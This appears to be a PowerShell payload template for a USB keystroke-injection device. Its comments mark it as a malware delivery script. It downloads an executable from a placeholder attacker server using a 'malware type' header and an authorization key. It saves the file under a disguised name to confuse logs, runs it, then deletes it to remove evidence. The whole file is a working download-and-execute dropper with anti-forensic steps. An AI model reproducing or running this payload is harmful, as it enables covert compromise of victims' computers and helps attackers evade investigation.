<# 
    General Payload Template for the USB Keyboard to type into PowerShell.
    Fill out necessary information before you start.
    
    Documentation - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4
#>

$IP_ADDR = "<http://Insert_IP_ADDRESS_of_NODEJS_SERVER>"

# NOTE: ` --> `` in Powershell since that is an escape character.
$AUTH_KEY = "<INSERT_AUTHKEY_HERE>"

# Craft our HTTP parameter. We need to use IDictionary for this in PowerShell since we'll pass it in with the `methods` parameter
$GET_HEADER = New-Object System.Collections.Hashtable;
$GET_HEADER.Add("exe", "<INSERT MALWARE TYPE - ie. Enumerator >");
$GET_HEADER.Add("authorization", $AUTH_KEY);

# Create HTTP Object
# Export the code in an innocuous .exe file so it kinda baffles the log files
$HTTP_REQUEST = Invoke-WebRequest -Uri $IP_ADDR -Method Get -Headers $GET_HEADER -OutFile ./wifi_out.exe

./wifi_out.exe

# Get rid of evidence
rm ./wifi_out.exe